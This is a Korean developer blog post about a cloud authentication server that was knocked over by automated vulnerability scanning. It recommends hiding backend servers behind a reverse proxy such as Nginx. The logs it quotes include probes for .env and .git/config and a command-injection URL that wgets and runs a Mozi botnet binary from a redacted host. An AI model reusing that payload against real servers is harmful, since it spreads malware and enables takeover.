---
layout: post
title: "자잘한 도움말 #11 이름 모를 외국인들에게 공격당함"
description: ""
date: 2023-09-11 23:09:00 +0900
categories: [Micro]
---

## TL;DR

- 클라우드에 여러 서버 인스턴스를 열어 두었는데 수상한 접근 시도를 발견했다.

```
[Nest] 9095  - xx/xx/xxxx, x:xx:xx AM	[HttpFilter]
{
  "statusCode":404,
  "message":"Cannot GET /shell?cd+/tmp;rm+-rf+*;wget+http://xx.xx.xx.xx:xxxxx/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws",
  "error":"Not Found"
}
hostname: xx.xxx.xxx.xx, addr: ::ffff:xx.xx.xx.xx
```

- 요청을 직접 받을 서버만 공개하고 프록시를 사용하자.
  - 프론트엔드 프레임워크(Vue, React) 수준의 프록시 설정은 개발용 설정이다.
  - 배포 환경에서는 Nginx나 Apache 같은 웹 서버에서 프록시를 설정하자. 

----

## 이하 그리 중요하진 않은 내용들

### 험난한 정보의 바다

인터넷을 정보의 바다라고들 한다. 아마 한.. 30년 전 부터.. 이젠 좀 삭았지만 나는 이 표현을 좋아한다. 겉으로 보기엔 평화롭고 풍요로워 보이는 수면 아래에 이런 상어들이 득실거리고 있다는 사실을 잘 나타내거든.

![경쟁상대](https://i.postimg.cc/jshdKXWs/image.png)  
{: .center .w-3-quarter}

특히 해커맨, 그들은 우리의 IP를 언제든지 알고 있다. 오늘은 외부 접속이 가능하도록 공개된 서버를 구축하는 중 내가 겪었던 일에 대해 코멘트를 달아 보고자 한다. 쉘 환경에서 명령어를 입력한다던가, 코드를 수정한다던가, 운영체제의 설정 파일을 건드리는 내용은 아니다. 좀 더 이론 혹은 지침에 가까운 내용을 다뤄볼 계획이다. 

### 작년 이맘 때에...

당시 상황에 대해 먼저 정리해보자. 크게 5개 요소로 이루어진 서비스를 구축해야 하는 상황이었다. 그 중 하나는 사용자 로컬 PC에서 동작해야 하는 에이전트 프로그램이기 때문에 제외하고, 서버 인스턴스를 4개 제공받았다. 그림으로 그려볼까.

![대략적](https://i.postimg.cc/L4BGvRNM/briefarch.png)  
{: .center}

사실 각 서버 프로그램들을 하나의 인스턴스 안에 세팅해도 됐지만, 어쩌다보니 누추한 서비스에 비해 과분한 대접을 받게 되었다. 나는 각 인스턴스마다 필요한 포트를 담당자분께 요청하고, 외부에서 접근이 가능하도록 만들었다. 위 구성에 기반해 내가 생각한 서비스의 접근 형태는 다음과 같았다.

![뭔가 이상하겠지만 그래도 참아](https://i.postimg.cc/rpzLPpQH/first.png)  
{: .center}

비록 당시 각 구성요소들이 어떻게 동작하는지는 잘 몰랐지만, 이렇게 가정하고 서비스를 구축해 어쨌든 잘 동작하는 것을 확인하였다. 그리고 몇 주 뒤, **인증 서버가 사망하게 되는데...**

### 부검

로그인이 안된다는 연락을 받은 나는 인증 서버의 인스턴스에 접속해 서버가 죽은 것을 발견하였다. 로그엔 서버의 단말마가 이렇게 기록되어 있었다.

![단말마](https://i.postimg.cc/3JV8zpBV/image.png)  
{: .center .rounded-edge}

![단말마2](https://i.postimg.cc/mgsB0ZwR/image.png)  
조금 개선된 버전
{: .center .rounded-edge}

수많은 404 에러의 향연, 애초에 제한된 사용자에게만 공개될 서비스였는데 비이상적으로 많은 요청 실패가 기록되어 있다. 게다가 요청 경로들의 면면들이 모두 흉악하다.

- `/.env`
- `/.git/config`
- `/test`
- `/Api/GetCmd.aspx`
- `/shell?cd+/tmp;rm+-rf+*;wget+http://xx.xx.xx.xx:xxxxx/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws`

다행히 정보가 나간 정황은 보이지 않았다. 애초에 그럴 정보가 들어있지도 않은 상태였고. 감당할 수 없는 요청이 들어와 서버 프로세스가 사망했거나 인스턴스가 재부팅 되었을 것이다. 3개의 서버 중 한 서버에만 공격이 발견되었는데, 때마침 그 서버의 이름은 XXX-**auth**. 즉 로그인/유저정보 관리 등을 수행하는 인증 서버였다. 누가봐도 악의적인 공격.

![해커맨](https://i.postimg.cc/K80c5nhw/image.png)  
"당신의 IP를 언제든지 알고 있음"
{: .center}

내가 요청받은 요청 경로의 이름들을 살펴보자, 민감한 설정 파일들, 뭔가 동작하게 만들 수 있을 것 같은 명령어, 그 악명높은 `rm -rf`도 섞여있다. 동시에 `wget`으로 `Mozi.a`라는 파일을 받으려 하는 것도 볼 수 있다. 검색을 해보니 Mozi Botnet이라는 악성코드와 연관된 것으로 보인다. 아마 내 인스턴스를 좀비 PC로 만드려는 시도였겠지. 공격자는 미리 유명 클라우드들의 IP 테이블들을 준비, 80 포트가 443 포트 혹은 기타 자주 사용되는 포트로 요청을 보내는 스크립트를 구동 해놓았을 것이다. 그 중 Timeout이 아닌 응답을 주는 호스트들을 기록했을 것이고, 거기서 API 안내 페이지나 기타 정보를 통해 **Auth**라는 이름을 가진 내 인증 서버를 발견했을 것이다. 그리고 본인이 가진 좀비 PC들을 동원, 공격 대상을 향해 무차별적인 취약점 탐색 시도. 이런 공격 방법을 웹 스캐닝(Web Scanning)이라고 한다. GPT가 요약해준 설명을 보고 가자.

> 웹 스캐닝은 보안 감사나 취약점 평가 등을 위해 특정 웹 사이트나 애플리케이션을 타겟으로 하는 것입니다. 정적 및 동적 콘텐츠 분석, 입력 유효성 검사, SQL 인젝션 또는 XSS(크로스 사이트 스크립팅)와 같은 일반적인 보안 취약점 탐지 등에 초점을 맞춥니다. 주로 보안 전문가들 혹은 악의적인 해커들에 의해 사용되며, 이 경우 권한 없는 접근 시도 및 취약점 공격을 포함할 수 있습니다.


### 소 잃고 외양간 고치기

내가 생각한 서비스 구조

웹 어플리케이션에서 사용자 PC가 직접 리소스 서버, 인증 서버에 요청을 보낸다. -> 사실 리소스 서버, 인증 서버에 대한 접근은 제대로 인증된 사용자에게만 공개되어야 하는데, 포트를 열어놓은 순간 전세계의 모든 사용자에게 공개된 꼴.
0.0.0.0에서 255.255.255.255 까지 입력하면 내 서버 주소 찾을 수 있을걸? API에 대한 접근 제한은 코드상에 구현되어 있었지만, 요청 자체를 막을 순 없다. 서버는 요청을 받고 404나 403을 보내줄 뿐. 결과적으로 이 방법은 CORS를 위반. (http://54.34.23.1/ 웹 서버가 http://54.34.23.2/ 리소스를 사용하는 꼴이니까. 동일 출처가 아님)

개선방향

- Auth 서버 정상 로그를 확인했을 때 웹앱의 인증 요청은 모두 WAS의 주소를 통해 오게됨
- 클라우드 인스턴스 인프라 설정 시 분리된 인증 서버에 대하여, 굳이 인증서버의 포트를 공개할 필요가 없다.
  - WAS가 알아서 보낸다.


리소스 서버와 인증 서버를 숨겨야 한다. 이럴때 필요한 것이 프록시. 사실 프록시 설정은 프론트엔드에 되어 있었고, 내가 개발한게 아니었어서... 이부분에 대한 이해가 떨어졌던 것.
로드밸런서용 인스턴스를 하나 따로 빼놓거나, 프론트엔드용 웹 서버에 프록시를 설정해둘 수 있다. 프록시를 통해 백엔드 서버의 존재를 숨길 수 있고, 공격자의 가능한 공격 포인트를 줄일 수 있다.

(실습 넣자, Nginx의 리버스 프록시 설정)

### 번외1. 프론트엔드 프레임워크의 프록시와 실제 배포/운영용 프록시의 차이

프레임워크 레벨에서 제공해주는 프록시는 개발용. 대표적으로 CORS 문제를 해결하기 위해 사용한다. 물론 기능은 같기 때문에 운영단계에서도 사용 가능은 하다. 하지만 프론트엔드 웹 서버의 운영은 그런 프레임워크의 러너가 아니라 정적 파일을 빌드해서 nginx 등의 웹 서버를 통해 이루어져야 함.

  - Vue or React 자체 프록시 설정
    - 이건 개발용
    - 악명높은 CORS 문제 해결을 위해
      - 정확히는, CORS는 웹 환경에서 보안을 위해 필수적인 제한사항이고, 개발 중 이를 우회하기 위해 사용함.
  - 실제 서버 배포에선 webpack dev server가 아니라 빌드된 정적 파일들을 웹 서버를 통해 배포해야함. 여기에 별도 프록시 설정이 필요.
  
  - 프록시의 주된 목적 - 보안성, 캐싱, 로드밸런싱 등등

### 번외2. 웹 서버 vs 웹 어플리케이션 서버
이번 글 자료 찾는 중 헷갈리던 용어를 정리.

  - 번외 Web Server vs Web Application Server
    - React 같은 SPA 프레임워크로 만든 웹 페이지를 "웹 어플리케이션"이라고 부르는 것은 일반적
      - 애초에 Single Page Application이니까
    - 하지만 이걸 배포하는 서버 (일반적으로 Nginx)는 "웹 서버"라고 부름
      - 빌드된 정적 파일(HTML&JS&CSS)을 제공하니까
    - "웹 어플리케이션" 서버라기보단 웹 "어플리케이션 서버"로 생각하자.


## 내가 배운 것


- 내 정보를 무작정 공개하지 말자.
- 백문이 불여일견이랬다. 프록시를 왜 써야하는지, 애초에 프록시란게 뭔지 이름만 들어왔지 이해가 잘 안됐는데 직접 당해보니 알 것 같음.
- 동일 출처 정책이 존재하는 이유
- 웹 서버와 웹 어플리케이션 서버의 차이